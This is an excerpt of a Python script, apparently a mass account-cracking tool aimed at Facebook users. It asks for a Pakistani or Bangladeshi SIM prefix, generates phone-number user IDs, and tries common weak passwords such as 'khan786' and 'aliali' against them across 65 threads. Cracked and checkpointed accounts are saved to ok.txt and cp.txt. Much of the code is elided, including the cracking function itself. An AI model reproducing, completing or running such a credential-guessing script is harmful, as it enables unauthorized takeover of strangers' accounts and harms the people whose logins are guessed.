...
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner Owner AMJID ALI CHASKA
\033[97;1m>>     Facebook : AMJID ALI 
\033[97;1m>>     Version  : 1.1
\033[97;1m>>     Git hop  : AMJID ALI 
...
def random_number3():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE :92317,92319,92318,92345.ETC')
	linex()
	kode = input('[+]\x1b[97;1m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	...
	with ThreadPool(max_workers=65) as yaari:
		...
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru,'+92','khan786','khan1122','khan12','aliali']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
...
def bd():
	...
	os.system('clear')
	print(logo)
	print('\x1b[92;1m[√] EXAMPLE : 017 018,.ETC')
	linex()
	kode = input('[+]\x1b[97;1m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
